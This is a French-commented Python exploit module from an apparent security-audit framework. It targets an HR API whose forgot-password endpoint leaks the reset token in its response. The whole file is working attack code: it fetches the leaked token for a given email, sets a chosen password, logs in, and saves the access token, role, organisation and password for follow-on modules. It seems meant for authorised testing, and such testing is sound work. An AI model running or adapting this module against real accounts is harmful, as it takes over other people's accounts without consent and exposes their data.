"""HRAPI-2026-001 — prise de contrôle de compte via forgot-password."""

from __future__ import annotations
from .base import Module, Option, Context


class Exploit(Module):
    id = "HRAPI-2026-001"
    name = "auth/forgot_password_token_leak"
    cwe = "CWE-640"
    cvss = "9.8 (Critique)"
    description = (
        "forgot-password renvoie le jeton de reset en clair (debugToken). "
        "Avec la seule adresse e-mail, on impose un mot de passe et on prend "
        "le contrôle du compte. Stocke un token d'accès dans la session."
    )
    options = {
        "email": Option(required=True, help="e-mail du compte à compromettre"),
        "newpass": Option(default="Pwned-by-audit-123!", help="mot de passe à imposer"),
    }

    def run(self, ctx: Context) -> bool:
        email = self.opt(ctx.store, "email")
        newpass = self.opt(ctx.store, "newpass")

        data = ctx.client.forgot_password(email)
        token = data.get("debugToken")
        if not token:
            ctx.fail("Aucun debugToken dans la réponse : faille probablement corrigée.")
            return False
        ctx.ok(f"Jeton de reset fuité : {token}")

        if not ctx.client.reset_password(token, newpass).get("success"):
            ctx.fail("reset-password a échoué.")
            return False
        ctx.ok(f"Mot de passe imposé : {newpass}")

        session = ctx.client.login(email, newpass)
        access = session.get("tokens", {}).get("accessToken")
        user = session.get("user", {})
        if not access:
            ctx.fail("Login impossible après reset.")
            return False

        # Alimente le datastore partagé pour les modules suivants.
        # Clés SESSION_* distinctes des options (org/role) pour éviter toute collision.
        ctx.store["ACCESS"] = access
        ctx.store["USER_ID"] = user.get("id")
        ctx.store["SESSION_ORG"] = user.get("organizationId")
        ctx.store["SESSION_ROLE"] = user.get("systemRole")
        ctx.store["SESSION_PASS"] = newpass
        ctx.ok(f"Compte pris : role={user.get('systemRole')} org={user.get('organizationId')}")
        ctx.info("Token d'accès enregistré en session (store ACCESS).")
        return True
